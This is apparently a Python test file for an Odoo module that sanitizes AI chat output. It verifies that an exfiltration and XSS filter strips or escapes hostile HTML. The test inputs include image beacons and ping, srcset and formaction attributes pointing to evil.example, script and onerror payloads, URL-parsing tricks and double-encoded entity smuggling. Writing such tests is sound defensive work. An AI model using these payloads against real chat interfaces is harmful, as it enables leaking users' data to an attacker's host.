# -*- coding: utf-8 -*-
import pathlib
from unittest import mock

import lxml.html
from odoo.tests import BaseCase

from ..engine import html_output
from ..engine.html_output import (
    agent_step_markup,
    input_card_markup,
    markdown_to_plaintext_title,
    notification_markup,
    render_ai_markdown,
    sanitize_ai_html,
    tool_summary_markup,
)

BASE_URL = 'https://example.com'


class TestRenderAiMarkdown(BaseCase):

    def test_table_gets_classes(self):
        html = render_ai_markdown("| a | b |\n| - | - |\n| 1 | 2 |\n")
        self.assertIn('o_ow_ai_table', html)
        self.assertIn('table-bordered', html)

    def test_fenced_code_kept_as_text(self):
        html = render_ai_markdown("```\nprint('hi')\n```")
        self.assertIn('print(', html)
        self.assertIn('o_ow_ai_pre', html)

    def test_fenced_code_keeps_its_language(self):
        # the chat highlights code blocks (Prism) from the `language-*` class
        html = render_ai_markdown("```python\nprint('hi')\n```")
        self.assertIn('language-python', html)
        self.assertIn('o_ow_ai_pre', html)

    def test_blockquote_gets_class(self):
        html = render_ai_markdown("> quoted text")
        self.assertIn('o_ow_ai_quote', html)

    def test_code_block_with_img_onerror_is_escaped_text(self):
        html = render_ai_markdown("```\n<img src=x onerror=alert(1)>\n```")
        self.assertNotIn('<img', html)
        self.assertIn('&lt;img', html)

    def test_minimal_fallback_paragraphs_and_bold(self):
        with mock.patch.object(html_output, 'markdown2', None):
            html = render_ai_markdown("Hello **world**\n\nSecond paragraph")
        self.assertIn('<p>', html)
        self.assertIn('<strong>world</strong>', html)
        self.assertIn('Second paragraph', html)


class TestExfiltrationFilter(BaseCase):

    def test_markdown_image_removed(self):
        html = render_ai_markdown("![x](https://evil.example/track?q=1)")
        self.assertNotIn('<img', html)

    def test_raw_img_removed(self):
        html = sanitize_ai_html('<img src="https://evil.example/x.png">')
        self.assertNotIn('<img', html)

    def test_external_link_becomes_span(self):
        html = sanitize_ai_html('<a href="https://evil.example/?d=1">click</a>', base_url=BASE_URL)
        self.assertNotIn('<a ', html)
        self.assertIn('o_ow_ai_extlink', html)
        self.assertIn('evil.example', html)

    def test_internal_web_hash_link_kept(self):
        html = sanitize_ai_html('<a href="/web#id=1">record</a>', base_url=BASE_URL)
        self.assertIn('<a href="/web#id=1"', html)

    def test_same_host_absolute_link_kept(self):
        html = sanitize_ai_html(
            f'<a href="{BASE_URL}/odoo/res.partner/1">ok</a>', base_url=BASE_URL)
        self.assertIn('<a ', html)
        self.assertIn(f'{BASE_URL}/odoo/res.partner/1', html)
        self.assertIn('target="_blank"', html)

    def test_script_removed(self):
        html = sanitize_ai_html('<p>hi</p><script>alert(1)</script>')
        self.assertNotIn('<script', html)
        self.assertNotIn('alert(1)', html)

    def test_inline_style_url_removed(self):
        html = sanitize_ai_html('<p style="background:url(https://evil.example)">hi</p>')
        self.assertNotIn('style=', html)
        self.assertNotIn('url(', html)

    def test_internal_image_kept(self):
        html = sanitize_ai_html('<img src="/web/image/5">')
        self.assertIn('<img', html)
        self.assertIn('/web/image/5', html)

    def test_mailto_kept(self):
        html = sanitize_ai_html('<a href="mailto:a@b.com">mail</a>')
        self.assertIn('mailto:a@b.com', html)

    def test_tel_kept(self):
        html = sanitize_ai_html('<a href="tel:+31201234567">call</a>', base_url=BASE_URL)
        self.assertIn('<a href="tel:+31201234567"', html)

    def test_protocol_relative_link_is_external(self):
        html = sanitize_ai_html('<a href="//evil.example/?d=1">click</a>', base_url=BASE_URL)
        self.assertNotIn('<a ', html)
        self.assertIn('o_ow_ai_extlink', html)

    def test_backslash_link_is_external(self):
        # Browsers read `/\evil.example` as `//evil.example`.
        for href in ('/\\evil.example/?d=1', '\\\\evil.example/?d=1'):
            with self.subTest(href=href):
                html = sanitize_ai_html(f'<a href="{href}">click</a>', base_url=BASE_URL)
                self.assertNotIn('<a ', html)
                self.assertIn('o_ow_ai_extlink', html)

    def test_tab_after_leading_slash_is_external(self):
        # Browsers drop a tab inside a URL: `/<TAB>/evil.example` is
        # `//evil.example`. (`html_sanitize` already percent-encodes the tab,
        # so check the filter on its own.)
        html = html_output.strip_exfiltration('<a href="/\t/evil.example/?d=1">click</a>', BASE_URL)
        self.assertNotIn('<a ', html)
        self.assertIn('o_ow_ai_extlink', html)

    def test_protocol_relative_link_is_external_without_base_url(self):
        html = render_ai_markdown("[click](//evil.example/?d=1)")
        self.assertNotIn('<a ', html)

    def test_root_relative_link_kept(self):
        html = render_ai_markdown("[Acme](/odoo/res.partner/1)")
        self.assertIn('<a href="/odoo/res.partner/1"', html)

    def test_exfiltration_attributes_stripped(self):
        dirty = (
            '<a href="/odoo" ping="https://evil.example/ping">x</a>'
            '<table background="https://evil.example/bg.png"><tr><td>1</td></tr></table>'
            '<p srcset="https://evil.example/a.png 1x" poster="https://evil.example/p.png">t</p>'
            '<div formaction="https://evil.example/f">f</div>'
        )
        for html in (html_output.strip_exfiltration(dirty), sanitize_ai_html(dirty)):
            with self.subTest(html=html):
                for attribute in ('ping=', 'background=', 'srcset=', 'poster=', 'formaction=', 'evil.example'):
                    self.assertNotIn(attribute, html)
                self.assertIn('<a href="/odoo"', html)


class TestLeadingTextStaysEscaped(BaseCase):
    """Text before the first element (e.g. what is left of an unwrapped
    ``<form>``) must be written back escaped every time the HTML is parsed
    and serialised again, or each round decodes one level of entities."""

    SINGLE = '<form>&lt;img src="https://evil.example/p?d=secret"&gt;</form><p>y</p>'
    DOUBLE = '<form>&amp;lt;img src="https://evil.example/p?d=secret"&amp;gt;</form>\n<p>y</p>\n\n'
    # the text a reader must see, and how it is written in the HTML
    SINGLE_TEXT = ('<img src="https://evil.example/p?d=secret">', '&lt;img src=')
    DOUBLE_TEXT = ('&lt;img src="https://evil.example/p?d=secret"&gt;', '&amp;lt;img src=')

    def assert_inert(self, html, visible, escaped):
        self.assertNotIn('<img', html)
        wrapper = lxml.html.fragment_fromstring(html, create_parent='div')
        self.assertFalse(wrapper.xpath('.//img'))
        for el in wrapper.iter():
            for value in el.attrib.values():
                self.assertNotIn('evil.example', value)
        self.assertIn(escaped, html)
        self.assertIn(visible, wrapper.text_content())

    def test_encoded_img_stays_text(self):
        for text, (visible, escaped) in ((self.SINGLE, self.SINGLE_TEXT), (self.DOUBLE, self.DOUBLE_TEXT)):
            with self.subTest(text=text, render='markdown'):
                self.assert_inert(str(render_ai_markdown(text, base_url=BASE_URL)), visible, escaped)
            with self.subTest(text=text, render='sanitize'):
                self.assert_inert(str(sanitize_ai_html(text, base_url=BASE_URL)), visible, escaped)

    def test_ordinary_answers_render_as_before(self):
        html = str(render_ai_markdown(
            "AT&T is **bold**, see [partner](/odoo/res.partner/1)", base_url=BASE_URL))
        self.assertIn('AT&amp;T is <strong>bold</strong>', html)
        self.assertIn('<a href="/odoo/res.partner/1">partner</a>', html)
        html = str(sanitize_ai_html('AT&amp;T <b>bold</b> <a href="/odoo/res.partner/1">partner</a>'))
        self.assertEqual(html, '<p>AT&amp;T <b>bold</b> <a href="/odoo/res.partner/1">partner</a></p>')
        # ordinary leading text (left of an unwrapped <form>) reads the same, escaped once
        html = str(sanitize_ai_html('<form>AT&amp;T "q" it\'s</form><p>x</p>'))
        self.assertTrue(html.startswith('AT&amp;T '), html)
        wrapper = lxml.html.fragment_fromstring(html, create_parent='div')
        self.assertEqual(wrapper.text_content(), 'AT&T "q" it\'sx')


class TestModelClassesStripped(BaseCase):

    def test_overlay_classes_dropped(self):
        html = render_ai_markdown(
            '<div class="position-fixed top-0 start-0 w-100 h-100 o_ow_ai_input_card">Fake card</div>')
        self.assertIn('Fake card', html)
        self.assertNotIn('position-fixed', html)
        self.assertNotIn('o_ow_ai_input_card', html)
        self.assertNotIn('class=', html)

    def test_code_language_class_kept(self):
        html = render_ai_markdown("```sql\nSELECT 1\n```")
        self.assertIn('class="language-sql"', html)
        self.assertIn('o_ow_ai_pre', html)

    def test_raw_code_keeps_only_its_language_class(self):
        html = render_ai_markdown('<code class="language-js position-fixed">x()</code>')
        self.assertIn('class="language-js"', html)
        self.assertNotIn('position-fixed', html)


class TestSummaryMarkup(BaseCase):

    def test_tool_summary_markup(self):
        html = tool_summary_markup('check', 'Doing <thing>', 'call_1')
        self.assertIn('o_ow_ai_tool_summary', html)
        self.assertIn('data-id="call_1"', html)
        self.assertIn('&lt;thing&gt;', html)
        self.assertNotIn('data-oe-id', html)

    def test_tool_summary_markup_event_id(self):
        html = tool_summary_markup('check', 'Done', 'call_1', 7)
        self.assertIn('data-oe-id="7"', html)

    def test_tool_summary_markup_uses_odoo20_icon_convention(self):
        """Odoo 20 dropped Font Awesome: the icon is an `<i class="oi" data-icon="…">`
        (the same convention `view_button.js` uses for a button's `icon=`),
        never a `fa`/`fa-*` class."""
        html = tool_summary_markup('search', 'Searched contacts', 'call_1')
        self.assertIn('<i class="oi" data-icon="search"/>', html)
        self.assertNotIn('fa', html)

    def test_input_card_markup(self):
        html = input_card_markup(sanitize_ai_html('<p>Sure?</p>'))
        self.assertEqual(str(html), '<div class="o_ow_ai_input_card"><p>Sure?</p></div>')

    def test_agent_step_markup(self):
        inner = render_ai_markdown("hi")
        html = agent_step_markup(inner, 42)
        self.assertIn('o_ow_ai_agent_step', html)
        self.assertIn('data-id="42"', html)

    def test_notification_markup(self):
        body = render_ai_markdown("hi")
        html = notification_markup('ow_ai_note', body)
        self.assertIn('data-oe-type="ow_ai_note"', html)
        self.assertIn('o_mail_notification', html)


class TestMarkdownToPlaintextTitle(BaseCase):

    def test_strips_markdown(self):
        title = markdown_to_plaintext_title("**Refund** for [order](https://x)")
        self.assertNotIn('*', title)
        self.assertNotIn('[', title)
        self.assertIn('Refund', title)


class TestMarkupGuard(BaseCase):
    """Only ``engine/html_output.py`` (and tests) may construct ``Markup(``."""

    def test_only_html_output_constructs_markup(self):
        root = pathlib.Path(__file__).resolve().parent.parent
        offenders = []
        for path in root.rglob('*.py'):
            relative = path.relative_to(root)
            if relative.parts[0] == 'tests':
                continue
            if str(relative) == 'engine/html_output.py':
                continue
            source = path.read_text()
            if 'Markup(' in source:
                offenders.append(str(relative))
        self.assertFalse(offenders, f"Markup( used outside engine/html_output.py: {offenders}")
